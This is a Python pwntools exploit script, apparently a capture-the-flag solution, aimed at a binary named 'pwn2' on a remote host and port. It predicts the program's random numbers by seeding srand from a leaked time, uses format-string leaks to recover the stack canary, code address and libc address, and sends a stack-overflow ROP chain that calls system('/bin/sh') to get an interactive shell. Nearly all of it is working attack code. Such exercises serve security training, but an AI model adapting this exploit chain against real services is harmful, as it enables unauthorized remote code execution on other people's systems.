from pwn import *
import sys
import datetime
import ctypes

libc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
system_offset = 0x0453a0
puts_offset = 0x06f6a0
binsh_offset = 0x18ce17
rop_rdi = 0xce3 

if len(sys.argv) < 2:
	r = process('./pwn2')
	raw_input('debug')
else:
	host, port = '203.162.91.5', 6967
	r = remote(host, port)

def leakrand():
	r.recv(1)
	res = r.recv(7)
	tmp = ''
	i = 0
	for i in range(3):
		if res[i] == ':':
			i += 1
			break
		tmp += res[i]
		i += 1
	hour = int(tmp)
	tmp = ''
	for i in range(i,i+2):
		if res[i] == ']':
			break
		tmp += res[i]
		i += 1
	min = int(tmp)
	log.info(hour)
	log.info(min)
	return (min / 15 +1)*hour

seed = leakrand()
libc.srand(seed)
for j in range(16):
	number = libc.rand()
	r.sendlineafter('Enter your private number: ', str(number))

r.sendlineafter('What can I help you ?', '%19$p%25$p')
r.recv(1)
res = r.recv(18)
canary = int(res, 16)
log.info('canary %#x' %canary)

res = r.recv(14)
main_add = int(res, 16)
log.info('main_add %#x' %main_add)
code_add = main_add - 0xb38
puts_got = code_add + 0x201F80
rop_rdi_add = rop_rdi + code_add

payload = 'a'*0x58 + p64(canary) + 'a'*8
payload += p64(main_add)
r.sendlineafter('\nAre you sure to do that ? ', payload)

# return main
r.recvuntil('OK, done')
r.recv(1)
seed = leakrand()
libc.srand(seed)
for j in range(16):
	number = libc.rand()
	r.sendlineafter('Enter your private number: ', str(number))

r.sendlineafter('What can I help you ?',  '%9$slinh' + p64(puts_got))
r.recv(1)
res = r.recv(6) + '\x00'*2
puts_add = u64(res)
log.info('puts %#x' %puts_add)
libc_base = puts_add - puts_offset
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset

payload = 'a'*0x58 + p64(canary) + 'a'*8
payload += p64(rop_rdi_add) + p64(binsh_add) + p64(system_add)
r.sendlineafter('\nAre you sure to do that ? ', payload)

r.interactive()
r.close()

# FLAG